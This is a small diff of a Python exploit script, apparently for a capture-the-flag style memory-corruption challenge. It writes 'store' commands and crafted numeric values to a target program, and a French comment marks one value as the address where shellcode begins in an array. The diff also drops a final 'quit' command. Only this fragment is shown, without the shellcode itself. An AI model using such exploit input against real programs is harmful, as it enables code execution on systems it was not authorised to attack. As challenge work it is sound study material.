@@ -35,11 +35,8 @@ while i < 46:
 sys.stdout.write("store\n")
 sys.stdout.flush()
 time.sleep(0.2)
-sys.stdout.write("4294956384\n")
+sys.stdout.write("4294956384\n") # Addresse du debut du shellcode dans le tableau
 sys.stdout.flush()
 time.sleep(0.2)
 sys.stdout.write("1073741938\n")
-sys.stdout.flush()
-time.sleep(0.2)
-sys.stdout.write("quit\n")
 sys.stdout.flush()
